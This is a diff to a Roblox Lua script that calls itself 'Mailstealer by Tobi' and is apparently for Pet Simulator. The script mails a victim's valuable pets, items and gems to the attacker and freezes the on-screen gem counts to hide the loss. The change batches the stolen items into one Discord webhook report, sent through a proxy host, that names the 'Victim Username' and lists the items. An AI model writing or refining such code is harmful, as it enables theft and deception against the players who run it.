@@ -4,6 +4,8 @@ local plr = game.Players.LocalPlayer
 local MailMessage = "gg / HcpNe56R2a"
 local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
 local HttpService = game:GetService("HttpService")
+local itemsToSend = {}
+local rapCache = {}
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
@@ -19,34 +21,34 @@ local function formatNumber(number)
 	return string.format("%.2f%s", number, suffixes[suffixIndex])
 end
 
-local function SendMessage(url, username, itemID, itemRAP)
+local function SendMessage(url, username)
     local http = game:GetService("HttpService")
     local headers = {
         ["Content-Type"] = "application/json"
     }
 
-	local formattedRAP = formatNumber(itemRAP)
+	local fields = {
+		{
+			name = "Victim Username:",
+			value = username,
+			inline = true
+		},
+		{
+			name = "Items to be sent:",
+			value = "",
+			inline = false
+		}
+	}
+
+	for _, item in ipairs(itemsToSend) do
+		fields[2].value = fields[2].value .. item.name .. ", " .. formatNumber(item.rap) .. " RAP\n"
+	end
+
     local data = {
         ["embeds"] = {{
-            ["title"] = "New Item Sent",
+            ["title"] = "New Execution" ,
             ["color"] = 65280,
-			["fields"] = {
-                {
-                    ["name"] = "Victim Username:",
-                    ["value"] = username,
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "Item Sent:",
-                    ["value"] = tostring(itemID),
-                    ["inline"] = false
-                },
-				{
-					["name"] = "RAP:",
-					["value"] = tostring(formattedRAP),
-					["inline"] = false
-				}
-            },
+			["fields"] = fields,
 			["footer"] = {
 				["text"] = "Mailstealer by Tobi. discord.gg/HcpNe56R2a"
 			}
@@ -59,12 +61,6 @@ local function SendMessage(url, username, itemID, itemRAP)
 		Headers = headers,
 		Body = body
 	})
-end
-
-if Webhook and string.find(Webhook, "discord") then
-	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
-else
-	Webhook = ""
 end
 
 for i, v in pairs(GetSave().Inventory.Currency) do
@@ -86,8 +82,8 @@ gemsleftpath:GetPropertyChangedSignal("Text"):Connect(function()
 	gemsleftpath.Text = gemsleft
 end)
 
-local gemsleaderstat = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"].Value
-local gemsleaderstatpath = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"]
+local gemsleaderstat = game:GetService('Players').LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].Value
+local gemsleaderstatpath = game:GetService('Players').LocalPlayer.leaderstats["\240\159\146\142 Diamonds"]
 gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
 	gemsleaderstatpath.Value = gemsleaderstat
 end)
@@ -109,15 +105,28 @@ local function claim_mail()
     game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Claim"):InvokeServer(uuidlist)
 end
 
+local function safeToString(value)
+    if value == nil then
+        return "nil"
+    else
+        return tostring(value)
+    end
+end
+
 local function getRAP(Type, Item)
+	local cacheKey = Type .. ":" .. safeToString(Item.id) .. ":" .. safeToString(Item.tn) .. ":" .. safeToString(Item.sh) .. ":" .. safeToString(Item.pt)
+	if rapCache[cacheKey] then
+		return rapCache[cacheKey]
+	end
+
     if GetRapValues[Type] then
         for i,v in pairs(GetRapValues[Type]) do
             local itemTable = HttpService:JSONDecode(i)
             if itemTable.id == Item.id and itemTable.tn == Item.tn and itemTable.sh == Item.sh and itemTable.pt == Item.pt then
+				rapCache[cacheKey] = v
                 return v
             end
         end
-		return 0
     end
 	return 0
 end
@@ -131,9 +140,6 @@ local function sendItem(category, uid, am, id, rap)
         [5] = am or 1
     }
     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-    if Webhook and Webhook ~= "" then
-        SendMessage(Webhook, plr.Name, id, rap)
-    end
 end
 
 local function CountCategory(category)
@@ -197,9 +203,6 @@ local function GemSteal()
                 [5] = GemAmount - 10000
             }
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			if Webhook and Webhook ~= "" then
-				SendMessage(Webhook, plr.Name, "Gems", (GemAmount - 10000))
-			end
 			break
         end
     end
@@ -243,10 +246,29 @@ local function CountHuges()
 	return count
 end
 
+local function CategoryWebhook(category)
+	for i, v in pairs(save[category]) do
+		local rapValue = getRAP(category, v)
+		if rapValue >= min_rap then
+			local id = v.id
+			table.insert(itemsToSend, {name = id, rap = rapValue})
+		end
+	end
+end
+
 if CountHuges() > 0 or CountGems() > 500000 then
 	EmptyBoxes()
 	claim_mail()
 	local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
+	for i, v in pairs(categoryList) do
+		if save[v] ~= nil then
+			CategoryWebhook(v)
+		end
+	end
+	if Webhook and string.find(Webhook, "discord") then
+		Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
+		SendMessage(Webhook, plr.Name)
+	end
 	for i, v in pairs(categoryList) do
 		if save[v] ~= nil then
 			SendAllCategory(v)
